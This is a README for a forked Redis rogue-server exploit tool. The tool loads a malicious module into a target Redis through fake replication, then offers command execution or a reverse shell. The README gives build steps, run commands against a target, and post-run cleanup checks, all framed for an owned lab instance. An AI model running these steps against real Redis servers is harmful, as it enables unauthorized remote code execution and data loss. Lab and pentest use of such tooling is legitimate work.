# Redis Rogue Server Refined

An Apache-2.0 derivative of [n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server) for an **owned, disposable Redis lab**. It stages a Redis module through a fake replication server, checks the real MODULE LOAD reply, and offers command execution or a reverse shell. The module source was refined from the upstream exp.c; the bundled redismodule.h is retained from upstream. The original repository's Git history is preserved.

The upstream description says Redis <=5.0.5. This revision was motivated by one Redis 5.0.9 lab, but compatibility with other versions and deployments is not established. This technique requires the target to accept the relevant Redis configuration, replication, and module commands. Replication can replace the target's dataset: **use a disposable lab instance, not a production database**.

## Requirements

- Linux x86-64 build host with GCC and GNU Make (for a Linux x86-64 target)
- Python 3.8+ on the same host; no third-party Python packages
- A target Redis instance in your authorized lab that can connect back to the local IPv4 and listening port
- A writable target directory, /tmp by default

Build from the repository root. The generated module.so is ignored by Git and must be built for the target architecture:

~~~sh
make clean
make
file module.so
~~~

The file command should identify an ELF 64-bit shared object for x86-64. The script resolves module.so relative to its own location, so it also works from another current directory.

## Run against your lab

Use separate target and local addresses. Confirm that the target can reach the local listener port; the default is TCP 6379 because that was the reachable port in the motivating lab. If it is occupied or your lab uses a different allowed port, set --lport. The script starts the listener before changing replication settings.

~~~sh
TARGET_IPV4='YOUR_LAB_REDIS_IPV4'
LOCAL_IPV4='YOUR_REACHABLE_LINUX_IPV4'

python3 redis-rogue-server.py \
  --rhost "$TARGET_IPV4" --rport 6379 \
  --lhost "$LOCAL_IPV4" --lport 6379 \
  --dir /tmp --command id
~~~

Expected successful output includes MODULE LOAD: OK and the output of id. The program exits with a nonzero status if it cannot build the session or load the module; a menu alone is never treated as proof of success.

For an interactive command menu, omit --command:

~~~sh
python3 redis-rogue-server.py --rhost "$TARGET_IPV4" --lhost "$LOCAL_IPV4"
~~~

Choose i, enter a command such as id, then enter exit to return to the menu. Each command is a separate shell invocation; it is not a persistent terminal. Choose q to unload the module and quit.

For a reverse shell, start a listener on another **target-reachable** port, then choose r in the menu and enter its numeric IPv4 address and port. The module's system.rev response confirms only that the request was accepted. Verify the callback and user identity in the listener itself. The module runs with the Redis service account's privileges.

## Checks and recovery

The script records the original Redis dir and dbfilename, uses a random target-side .so name, restores standalone replication, removes the staged file, and restores the original settings. It unloads the module on exit. Cleanup is best effort if the connection or process fails; inspect the target afterward:

~~~sh
redis-cli -h "$TARGET_IPV4" -p 6379 ROLE
redis-cli -h "$TARGET_IPV4" -p 6379 CONFIG GET dir
redis-cli -h "$TARGET_IPV4" -p 6379 CONFIG GET dbfilename
redis-cli -h "$TARGET_IPV4" -p 6379 MODULE LIST
~~~

Compare those values with your own pre-run baseline. If MODULE LOAD fails, use -v to inspect the exact Redis reply, confirm the target directory is writable, verify architecture with file module.so, and check that the target can connect to the listener. The error may be generic even when the server log contains the specific filesystem or dlopen cause. Do not assume the module loaded just because replication transferred bytes.

The --exp option selects a different local module file. --passwd supports a password-protected lab, but a command-line password can be visible to local process listings; use only in a suitable test environment.

## Provenance and license

The original fake-replication concept, Python PoC, Redis module, and Redis module header come from [n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server), which credits [RicterZ/RedisModules-ExecuteCommand](https://github.com/RicterZ/RedisModules-ExecuteCommand). The upstream license is preserved in [LICENSE](LICENSE). This revision removes prebuilt objects and unused SDK utility code, and builds the corrected module from source at the repository root. Modified files carry attribution notices.
